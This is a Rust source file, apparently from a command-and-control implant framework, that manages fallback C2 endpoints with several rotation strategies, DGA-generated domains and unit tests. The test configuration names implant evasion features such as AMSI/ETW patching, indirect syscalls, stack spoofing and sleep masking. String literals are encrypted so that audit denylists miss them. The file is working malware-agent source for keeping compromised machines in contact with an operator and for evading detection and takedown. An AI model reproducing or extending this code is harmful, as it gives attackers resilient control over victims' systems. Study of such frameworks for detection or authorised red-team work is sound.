// src/agent/fallback.rs
//
// Fallback endpoint manager. Selects which C2 endpoint to try based on
// the configured strategy, tracks failures, and handles dead-endpoint
// rotation. Supports four strategies:
//
//   Priority - always try lowest-priority first, fall to next on failure
//   RoundRobin - cycle through in order
//   Random - weighted random selection
//   Failover - use first until dead, then permanently switch to next

use std::time::Instant;
use rand::Rng;
use crate::strcrypt_rt;
use strcrypt::aes_str;

use crate::common::{
    C2Config, FallbackEndpoint, FallbackStrategy,
    TransportProtocol, MalleableProfile, ProxyConfig,
};

/// Runtime state for a single endpoint.
struct EndpointState {
    endpoint: FallbackEndpoint,
    consecutive_failures: u32,
    dead_since: Option<Instant>,
    total_successes: u64,
    total_failures: u64,
}

impl EndpointState {
    fn is_dead(&self, dead_time_secs: u64) -> bool {
        if let Some(since) = self.dead_since {
            since.elapsed().as_secs() < dead_time_secs
        } else {
            false
        }
    }

    fn record_failure(&mut self, max_failures: u32) {
        self.consecutive_failures += 1;
        self.total_failures += 1;
        if self.consecutive_failures >= max_failures {
            self.dead_since = Some(Instant::now());
        }
    }

    fn record_success(&mut self) {
        self.consecutive_failures = 0;
        self.dead_since = None;
        self.total_successes += 1;
    }
}

/// Resolved connection parameters for one attempt.
#[derive(Clone, Debug)]
pub struct ResolvedEndpoint {
    pub host: String,
    pub port: u16,
    pub transport: TransportProtocol,
    pub profile: MalleableProfile,
    pub proxy: ProxyConfig,
    pub index: usize,
}

/// Manages fallback endpoint selection and failure tracking.
pub struct FallbackManager {
    states: Vec<EndpointState>,
    strategy: FallbackStrategy,
    dead_time_secs: u64,
    round_robin_index: usize,
    failover_index: usize,
    /// DGA window the current DGA endpoints were generated for, plus their
    /// host names so they can be swapped out on rollover. None when the
    /// build has no DGA config.
    dga_state: Option<(u64, Vec<String>)>,
}

impl FallbackManager {
    /// Build from a C2Config. If no fallback endpoints are configured,
    /// creates a single endpoint from `c2_host`/`tunnel_port`.
    pub fn from_config(config: &C2Config) -> Self {
        let mut endpoints = config.fallback.endpoints.clone();

        // Inject DGA-generated endpoints (appended after static ones),
        // remembering the window and host set for runtime rotation.
        let dga_state = crate::agent::dga::inject_dga_endpoints(config, &mut endpoints);

        // If no fallback endpoints, use the primary host as the only one
        if endpoints.is_empty() {
            endpoints.push(FallbackEndpoint {
                host: config.c2_host.clone(),
                port: config.tunnel_port,
                transport: config.transport.clone(),
                profile: None,
                proxy: None,
                priority: 0,
                weight: 1,
                max_failures: 5,
            });
        }

        // Sort by priority for Priority/Failover strategies
        endpoints.sort_by_key(|e| e.priority);

        let states = endpoints.into_iter().map(|ep| EndpointState {
            endpoint: ep,
            consecutive_failures: 0,
            dead_since: None,
            total_successes: 0,
            total_failures: 0,
        }).collect();

        Self {
            states,
            strategy: config.fallback.strategy.clone(),
            dead_time_secs: config.fallback.dead_time_secs,
            round_robin_index: 0,
            failover_index: 0,
            dga_state,
        }
    }

    /// Re-generate DGA endpoints when the time window has rolled over since
    /// they were last generated (docs/fallback.md promises per-window domain
    /// rotation). Static endpoints keep their failure state untouched.
    /// Returns true when the endpoint set actually changed. No-op when the
    /// build has no DGA config or the window has not advanced.
    pub fn rotate_dga_if_window_changed(&mut self, config: &C2Config) -> bool {
        let dga = match &config.dga {
            Some(d) => d,
            None    => return false,
        };
        let window = crate::agent::dga::current_window(dga.window_secs);
        match &self.dga_state {
            Some((w, _)) if *w != window => {}
            // No DGA endpoints tracked yet (or same window): nothing to do.
            // A None dga_state means DGA was not injected at startup, so
            // there is nothing to rotate.
            _ => return false,
        }

        // Drop the stale generation by host name, then add the new one.
        let old_hosts = self.dga_state.take().map(|(_, h)| h).unwrap_or_default();
        self.states.retain(|s| !old_hosts.contains(&s.endpoint.host));

        let new_eps = crate::agent::dga::generate_endpoints(
            dga, window, config.tunnel_port, &config.transport);
        let hosts: Vec<String> = new_eps.iter().map(|e| e.host.clone()).collect();
        for ep in new_eps {
            self.states.push(EndpointState {
                endpoint: ep,
                consecutive_failures: 0,
                dead_since: None,
                total_successes: 0,
                total_failures: 0,
            });
        }
        self.states.sort_by_key(|s| s.endpoint.priority);
        self.dga_state = Some((window, hosts));
        true
    }

    /// Select the next endpoint to try. Returns None if all endpoints are dead.
    pub fn next_endpoint(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        match self.strategy {
            FallbackStrategy::Priority => self.select_priority(config),
            FallbackStrategy::RoundRobin => self.select_round_robin(config),
            FallbackStrategy::Random => self.select_random(config),
            FallbackStrategy::Failover => self.select_failover(config),
        }
    }

    /// Mark the last-used endpoint as failed.
    pub fn record_failure(&mut self, index: usize) {
        if let Some(state) = self.states.get_mut(index) {
            let max = state.endpoint.max_failures;
            state.record_failure(max);
        }
    }

    /// Mark the last-used endpoint as successful.
    pub fn record_success(&mut self, index: usize) {
        if let Some(state) = self.states.get_mut(index) {
            state.record_success();
        }
    }

    /// Check if all endpoints are dead. If so, only reset those whose
    /// configured dead time has fully elapsed. This prevents tight retry
    /// loops: when every endpoint is down and still within its dead time,
    /// no endpoint is reset and `select()` returns `None`, letting the
    /// caller back off with its normal sleep interval instead of hammering
    /// every endpoint in a hot loop.
    pub fn check_and_reset_if_all_dead(&mut self) {
        let all_dead = self.states.iter().all(|s| s.is_dead(self.dead_time_secs));
        if !all_dead {
            return; // At least one endpoint is alive - nothing to do
        }
        // All are dead. Selectively reset only those whose dead time expired.
        for state in &mut self.states {
            if let Some(since) = state.dead_since {
                if since.elapsed().as_secs() >= self.dead_time_secs {
                    state.dead_since = None;
                    state.consecutive_failures = 0;
                }
            }
        }
    }

    /// Get a summary of endpoint health for diagnostics.
    pub fn status_summary(&self) -> String {
        self.states.iter().enumerate().map(|(i, s)| {
            let status = if s.is_dead(self.dead_time_secs) { aes_str!("DEAD") }
                else if s.consecutive_failures > 0 { aes_str!("DEGRADED") }
                else { aes_str!("OK") };
            format!("[{}] {}:{} ({:?}) — {} ({}{} {}{})",
                i, s.endpoint.host, s.endpoint.port, s.endpoint.transport,
                status, aes_str!("ok:"), s.total_successes, aes_str!("fail:"), s.total_failures)
        }).collect::<Vec<_>>().join("\n")
    }

    // ── Strategy implementations ───────────────────────────────────────

    fn resolve(&self, index: usize, config: &C2Config) -> ResolvedEndpoint {
        let ep = &self.states[index].endpoint;
        ResolvedEndpoint {
            host: ep.host.clone(),
            port: ep.port,
            transport: ep.transport.clone(),
            profile: ep.profile.clone().unwrap_or_else(|| config.profile.clone()),
            proxy: ep.proxy.clone().unwrap_or_else(|| config.proxy.clone()),
            index,
        }
    }

    fn select_priority(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        // Already sorted by priority; pick first non-dead
        for (i, state) in self.states.iter().enumerate() {
            if !state.is_dead(self.dead_time_secs) {
                return Some(self.resolve(i, config));
            }
        }
        // All dead and reset didn't help (shouldn't happen)
        Some(self.resolve(0, config))
    }

    fn select_round_robin(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        let len = self.states.len();
        for _ in 0..len {
            let idx = self.round_robin_index % len;
            self.round_robin_index += 1;
            if !self.states[idx].is_dead(self.dead_time_secs) {
                return Some(self.resolve(idx, config));
            }
        }
        Some(self.resolve(0, config))
    }

    fn select_random(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        self.check_and_reset_if_all_dead();
        let alive: Vec<usize> = self.states.iter().enumerate()
            .filter(|(_, s)| !s.is_dead(self.dead_time_secs))
            .map(|(i, _)| i)
            .collect();

        if alive.is_empty() {
            return Some(self.resolve(0, config));
        }

        // Weighted selection
        let total_weight: u32 = alive.iter()
            .map(|&i| self.states[i].endpoint.weight)
            .sum();

        if total_weight == 0 {
            let idx = alive[rand::thread_rng().gen_range(0..alive.len())];
            return Some(self.resolve(idx, config));
        }

        let mut roll = rand::thread_rng().gen_range(0..total_weight);
        for &idx in &alive {
            let w = self.states[idx].endpoint.weight;
            if roll < w {
                return Some(self.resolve(idx, config));
            }
            roll -= w;
        }

        Some(self.resolve(alive[0], config))
    }

    fn select_failover(&mut self, config: &C2Config) -> Option<ResolvedEndpoint> {
        // In failover, once an endpoint is dead, we move to the next permanently
        let len = self.states.len();
        while self.failover_index < len {
            let idx = self.failover_index;
            if !self.states[idx].is_dead(self.dead_time_secs) {
                return Some(self.resolve(idx, config));
            }
            self.failover_index += 1;
        }
        // All exhausted - wrap around
        self.failover_index = 0;
        self.check_and_reset_if_all_dead();
        Some(self.resolve(0, config))
    }
}

/// Validate that every fallback endpoint's transport tag belongs to the
/// same family as the build transport. HTTP-family builds
/// (Http/Https) can only dial HTTP-family endpoints; stream builds
/// (Tls/TcpPlain/NamedPipe) cannot dial HTTP endpoints. A mismatch is a
/// hard error at config load instead of a silently mis-dialed endpoint.
/// Mixed-transport fallback lists are not supported; lifting that limit
/// needs per-endpoint connection routing in the agent loop.
pub fn validate_transport_consistency(config: &C2Config) -> Result<(), String> {
    fn is_http(t: &TransportProtocol) -> bool {
        matches!(t, TransportProtocol::Http | TransportProtocol::Https)
    }
    let build_http = is_http(&config.transport);
    for (i, ep) in config.fallback.endpoints.iter().enumerate() {
        if is_http(&ep.transport) != build_http {
            // aes_str! pieces: the audit denylist flags cleartext transport
            // terms in the agent binary.
            return Err(format!(
                "{} {} ({}:{}) {} {:?}, {} {:?}: {}",
                aes_str!("fallback endpoint"), i, ep.host, ep.port,
                aes_str!("uses transport"), ep.transport,
                aes_str!("incompatible with build transport"), config.transport,
                aes_str!("mixed-transport fallback lists are not supported"),
            ));
        }
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{
        C2Config, DgaConfig, FallbackConfig, FallbackEndpoint, FallbackStrategy,
        TransportProtocol, MalleableProfile, ProxyConfig,
    };

    fn ep(host: &str, port: u16, priority: u32) -> FallbackEndpoint {
        FallbackEndpoint {
            host: host.into(), port, priority,
            transport: TransportProtocol::Tls,
            profile: None, proxy: None,
            weight: 1, max_failures: 3,
        }
    }

    fn cfg(eps: Vec<FallbackEndpoint>, strategy: FallbackStrategy) -> C2Config {
        C2Config {
            transport: TransportProtocol::Tls,
            profile: MalleableProfile::default(),
            proxy: ProxyConfig::default(),
            fallback: FallbackConfig { endpoints: eps, strategy, dead_time_secs: 5 },
            server_public_key: String::new(),
            hash_salt: String::new(),
            c2_host: "primary.example".into(),
            build_id: "test-build".into(),
            tunnel_port: 4443,
            sleep_interval: 5,
            jitter_min: 0, jitter_max: 0,
            bloat_mb: 0, debug: false,
            kill_date: None,
            challenge_key: String::new(),
            sni_override: None,
            alpn_protocols: vec![],
            hibernation_mode: false,
            task_batch_size: 10,
            dga: None,
            valid_parents: Vec::new(),
            sleep_mask: "ekko".to_string(),
            indirect_syscalls: true,
            stack_spoof: true,
            patch_amsi_etw: true,
            heap_encrypt: true,
            guard_domain: String::new(),
            guard_hostname: String::new(),
            guard_hour_start: 0,
            guard_hour_end: 0,
            guard_no_system: false,
            auto_pivot_port: None,
        }
    }

    #[test]
    fn no_endpoints_falls_back_to_primary() {
        let c = cfg(vec![], FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        let r = mgr.next_endpoint(&c).unwrap();
        assert_eq!(r.host, "primary.example");
        assert_eq!(r.port, 4443);
    }

    #[test]
    fn priority_picks_lowest_first() {
        let c = cfg(vec![ep("b.example", 443, 10), ep("a.example", 443, 0)],
            FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "a.example");
    }

    #[test]
    fn priority_skips_dead_endpoint() {
        let c = cfg(vec![ep("a.example", 443, 0), ep("b.example", 443, 1)],
            FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        let r = mgr.next_endpoint(&c).unwrap();
        mgr.record_failure(r.index);
        mgr.record_failure(r.index);
        mgr.record_failure(r.index); // dead
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "b.example");
    }

    #[test]
    fn round_robin_cycles_in_order() {
        let c = cfg(vec![ep("a.example", 443, 0), ep("b.example", 443, 0),
            ep("c.example", 443, 0)], FallbackStrategy::RoundRobin);
        let mut mgr = FallbackManager::from_config(&c);
        let hosts: Vec<_> = (0..6).map(|_| mgr.next_endpoint(&c).unwrap().host).collect();
        assert_eq!(&hosts[..3], &["a.example", "b.example", "c.example"]);
        assert_eq!(hosts[3], "a.example"); // wrap
    }

    #[test]
    fn round_robin_skips_dead() {
        let c = cfg(vec![ep("a.example", 443, 0), ep("b.example", 443, 0),
            ep("c.example", 443, 0)], FallbackStrategy::RoundRobin);
        let mut mgr = FallbackManager::from_config(&c);
        let _a = mgr.next_endpoint(&c).unwrap();
        let b  = mgr.next_endpoint(&c).unwrap();
        assert_eq!(b.host, "b.example");
        mgr.record_failure(b.index);
        mgr.record_failure(b.index);
        mgr.record_failure(b.index);
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "c.example");
    }

    #[test]
    fn failover_sticks_then_permanently_switches() {
        let c = cfg(vec![ep("primary.example", 443, 0), ep("backup.example", 443, 1)],
            FallbackStrategy::Failover);
        let mut mgr = FallbackManager::from_config(&c);
        for _ in 0..3 {
            let r = mgr.next_endpoint(&c).unwrap();
            assert_eq!(r.host, "primary.example");
            mgr.record_success(r.index);
        }
        let r = mgr.next_endpoint(&c).unwrap();
        mgr.record_failure(r.index);
        mgr.record_failure(r.index);
        mgr.record_failure(r.index);
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "backup.example");
    }

    #[test]
    fn random_strategy_stays_within_live_endpoints() {
        let c = cfg(vec![ep("a.example", 443, 0), ep("b.example", 443, 0)],
            FallbackStrategy::Random);
        let mut mgr = FallbackManager::from_config(&c);
        for _ in 0..20 {
            let r = mgr.next_endpoint(&c).unwrap();
            assert!(["a.example", "b.example"].contains(&r.host.as_str()));
        }
    }

    #[test]
    fn success_resets_consecutive_failures() {
        let c = cfg(vec![ep("h.example", 443, 0)], FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        mgr.record_failure(0);
        mgr.record_failure(0); // 2, not yet dead
        mgr.record_success(0); // reset
        mgr.record_failure(0);
        mgr.record_failure(0); // still only 2
        assert!(mgr.next_endpoint(&c).is_some());
    }

    #[test]
    fn all_dead_triggers_reset_path() {
        let c = cfg(vec![ep("a.example", 443, 0), ep("b.example", 443, 0)],
            FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        for i in 0..2 { for _ in 0..3 { mgr.record_failure(i); } }
        assert!(mgr.next_endpoint(&c).is_some()); // must not panic/return None
    }

    #[test]
    fn dga_endpoints_rotate_on_window_rollover() {
        let dga = crate::common::DgaConfig {
            seed: 42,
            window_secs: 1, // 1-second window: rollover after a short sleep
            count: 3,
            tlds: vec!["com".into(), "net".into()],
            max_failures_per_domain: 2,
        };
        let mut c = cfg(vec![ep("static.example", 443, 0)], FallbackStrategy::RoundRobin);
        c.dga = Some(dga);
        let mut mgr = FallbackManager::from_config(&c);

        // 4 endpoints: 1 static + 3 DGA
        let collect = |mgr: &mut FallbackManager, c: &C2Config| -> Vec<String> {
            (0..4).map(|_| mgr.next_endpoint(c).unwrap().host).collect()
        };
        let before = collect(&mut mgr, &c);
        assert!(before.contains(&"static.example".to_string()));

        // Same window: no rotation.
        assert!(!mgr.rotate_dga_if_window_changed(&c));

        // Force a rollover and confirm the DGA set is swapped while the
        // static endpoint survives untouched.
        std::thread::sleep(std::time::Duration::from_millis(1100));
        assert!(mgr.rotate_dga_if_window_changed(&c));
        let after = collect(&mut mgr, &c);
        assert!(after.contains(&"static.example".to_string()));
        let dga_before: Vec<&String> = before.iter().filter(|h| *h != "static.example").collect();
        let dga_after: Vec<&String> = after.iter().filter(|h| *h != "static.example").collect();
        assert_eq!(dga_after.len(), 3);
        assert_ne!(dga_before, dga_after, "domains must change with the window");
    }

    #[test]
    fn dga_rotation_noop_without_dga() {
        let c = cfg(vec![ep("h.example", 443, 0)], FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        assert!(!mgr.rotate_dga_if_window_changed(&c));
    }

    #[test]
    fn per_endpoint_profile_override_used() {
        let custom = MalleableProfile { name: "custom".into(), ..MalleableProfile::default() };
        let mut c = cfg(vec![], FallbackStrategy::Priority);
        c.fallback.endpoints.push(FallbackEndpoint {
            host: "ep.example".into(), port: 443,
            transport: TransportProtocol::Tls,
            profile: Some(custom), proxy: None,
            priority: 0, weight: 1, max_failures: 3,
        });
        let mut mgr = FallbackManager::from_config(&c);
        assert_eq!(mgr.next_endpoint(&c).unwrap().profile.name, "custom");
    }

    #[test]
    fn status_summary_reflects_ok_degraded_dead() {
        let c = cfg(vec![ep("ok.example", 443, 0), ep("deg.example", 443, 1),
            ep("dead.example", 443, 2)], FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        mgr.record_success(0);
        mgr.record_failure(1);
        mgr.record_failure(2); mgr.record_failure(2); mgr.record_failure(2);
        let s = mgr.status_summary();
        assert!(s.contains("OK") && s.contains("DEGRADED") && s.contains("DEAD"));
    }

    #[test]
    fn dga_endpoints_injected_when_configured() {
        let mut c = cfg(vec![], FallbackStrategy::Priority);
        c.dga = Some(DgaConfig {
            seed: 0xDEAD_BEEF, window_secs: 86400,
            count: 5, tlds: vec!["com".into()],
            max_failures_per_domain: 2,
        });
        let mut mgr = FallbackManager::from_config(&c);
        let first = mgr.next_endpoint(&c).unwrap();
        assert!(first.host.ends_with(".com"),
            "DGA endpoint '{}' should end with .com", first.host);
    }

    #[test]
    fn dga_endpoints_lower_priority_than_static() {
        let mut c = cfg(vec![ep("static.example", 443, 0)], FallbackStrategy::Priority);
        c.dga = Some(DgaConfig {
            seed: 1, window_secs: 86400,
            count: 3, tlds: vec!["net".into()],
            max_failures_per_domain: 2,
        });
        let mut mgr = FallbackManager::from_config(&c);
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "static.example");
    }

    #[test]
    fn no_dga_config_is_transparent() {
        let c = cfg(vec![ep("only.example", 443, 0)], FallbackStrategy::Priority);
        let mut mgr = FallbackManager::from_config(&c);
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "only.example");
    }
}